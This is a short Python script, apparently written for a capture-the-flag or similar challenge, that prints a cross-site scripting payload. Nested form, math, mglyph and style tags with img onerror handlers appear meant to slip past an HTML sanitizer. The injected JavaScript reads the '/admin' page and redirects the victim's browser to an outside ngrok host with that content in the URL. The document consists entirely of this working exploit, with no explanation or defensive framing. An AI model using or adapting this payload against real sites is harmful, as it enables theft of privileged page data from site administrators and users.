command="""var xhttp = new XMLHttpRequest();xhttp.onreadystatechange = function() {if (xhttp.readyState == XMLHttpRequest.DONE && this.status == 200) {document.location='https://7c2f-103-93-37-12.ngrok.io/test.html?c'+encodeURIComponent(xhttp.responseText);}};xhttp.open('GET', '/admin', true);xhttp.send();"""

pay=f"""<form><math><mtext>
<form><mglyph><style>
</math>
<img src onerror="{command}">
<form><math><mtext></form>
<form><mglyph><style></math>
<img src onerror="{command}">
 1 
<form><math><mtext></form><form><mglyph><style></math>
<img src onerror="{command}">
</style></mglyph></form></mtext></math></form>\\n\\n"""

print(pay)